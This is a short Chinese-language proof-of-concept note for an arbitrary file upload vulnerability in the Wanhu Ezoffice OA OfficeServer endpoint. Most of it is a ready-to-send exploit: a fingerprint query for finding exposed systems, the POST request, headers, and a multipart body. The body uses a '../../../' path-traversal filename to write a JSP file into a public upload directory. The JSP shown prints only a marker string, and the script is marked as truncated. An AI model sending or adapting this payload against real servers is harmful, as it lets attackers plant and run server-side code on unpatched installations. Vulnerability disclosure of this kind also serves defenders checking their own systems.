# 万户协同办公平台OfficeServer存在任意文件上传漏洞

- **系统**：万户协同办公平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="万户 Ezoffice OA"`
- **请求**：`POST /defaultroot/OfficeServer HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Content-Length: 621`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="value1"
{"OPTION":"SAVEPDF"}
--00content0boundary00
Content-Disposition: form-data; name="value2"
{"PDFPZ":"1"}
--00content0boundary00
Content-Disposition: form-data; name="value3"
{"FILENAMETRUE":"../../../public/upload/stc.jsp."}
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="stc.jsp"
Content-Type: text/plain
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="hello.jsp"
Content-Type: image/jpeg
<% out.println("435352Els1K9wZvOlSsdsdmrg"); %>
--00content0boundary00--

上传文件位置…（脚本共 635 字，完整版见原文）
```

**其他**
- 万户协同办公平台 OfficeServer存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 万户ezoffice